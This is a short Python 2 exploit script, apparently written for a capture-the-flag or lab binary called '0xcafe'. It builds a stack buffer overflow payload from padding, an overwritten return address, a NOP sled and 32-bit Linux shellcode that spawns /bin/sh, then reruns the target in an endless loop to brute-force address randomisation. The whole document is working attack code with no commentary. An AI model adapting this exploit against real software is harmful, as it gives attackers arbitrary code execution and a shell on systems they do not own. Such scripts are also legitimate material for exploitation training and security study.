#!/usr/bin/python

import struct, sys, time
from subprocess import PIPE, Popen

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

bufsize = 100
offset = 12     #incl. saved ebp
nopsize = 4096

def prep_buffer(addr_buffer):
    buf = "A" * (bufsize+offset)
    buf += struct.pack("<I",(addr_buffer+bufsize+offset+4))
    buf += "\x90" * nopsize
    buf += shellcode
    return buf

def brute_aslr(buf):
    p = Popen(['./0xcafe'], stdin=PIPE)
    p.communicate(input=buf)

if __name__ == '__main__':
    addr_buffer = 0xff92b39c    # randomly decided
    buf = prep_buffer(addr_buffer)
    i = 0
    while True:
        print i
        brute_aslr(buf)
        i += 1